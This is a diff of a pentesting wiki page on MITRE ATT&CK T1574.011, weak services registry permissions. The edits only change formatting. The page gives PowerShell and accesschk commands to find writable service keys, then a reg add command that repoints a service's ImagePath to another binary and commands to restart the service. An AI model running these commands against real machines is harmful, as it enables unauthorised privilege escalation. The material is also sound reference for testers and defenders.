@@ -1,5 +1,7 @@
 ---
-description: MITRE ATT&CK™ Hijack Execution Flow - Services Registry Permissions Weakness - Technique T1574.011
+description: >-
+  MITRE ATT&CK™ Hijack Execution Flow - Services Registry Permissions Weakness -
+  Technique T1574.011
 ---
 
 # Weak Registry Permissions
@@ -15,6 +17,7 @@ An attacker can leverage this misconfiguration to modify the ImagePath of servic
 {% tabs %}
 {% tab title="Enumerate" %}
 We can check our permissions over services registry doing:
+
 ```powershell
 #Get the binary paths of the services
 reg query hklm\System\CurrentControlSet\Services /s /v imagepath
@@ -27,7 +30,9 @@ get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "
 
 Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\<ServiceName> | fl
 ```
+
 Alternativly, we can use [AccessChk](https://learn.microsoft.com/fr-fr/sysinternals/downloads/accesschk) from sysinternals tools to enum permissions over services.
+
 ```powershell
 #List rights for authenticated users on registry
 accesschk64.exe /accepteula "authenticated users" -kvuqsw hklm\System\CurrentControlSet\services
@@ -48,11 +53,13 @@ winPEASx64.exe servicesinfo
 
 {% tab title="Exploit" %}
 To change the path of th binary
+
 ```powershell
 reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
 ```
 
 And then, restart the service
+
 ```powershell
 #Using wmic
 wmic service <Service_Name> call stopservice
@@ -68,7 +75,7 @@ sc start <Service_Name>
 {% endtab %}
 {% endtabs %}
 
-## References
+## Resources
 
 {% embed url="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-modify-permissions" %}
 
